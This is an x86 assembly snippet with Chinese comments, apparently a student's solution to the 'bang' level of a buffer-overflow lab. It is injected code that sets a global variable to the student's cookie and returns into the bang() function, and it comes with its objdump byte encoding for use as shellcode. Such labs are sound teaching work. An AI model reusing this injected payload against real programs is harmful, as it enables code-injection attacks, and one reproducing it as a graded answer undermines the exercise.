.code32
.section .data
.section .text
.globl _start
_start:
    movl $0x17dab4ef,0x804d10c       # 0x17dab4ef是我的cookie，0x804d10c存的global_value
    push $0x08048d52                 # 0x08048d52是bang()函数的地址
    ret

# 00000000 <_start>:
#    0:   c7 05 0c d1 04 08 ef    movl   $0x17dab4ef,0x804d10c
#    7:   b4 da 17 
#    a:   68 52 8d 04 08          push   $0x8048d52
#    f:   c3                      ret 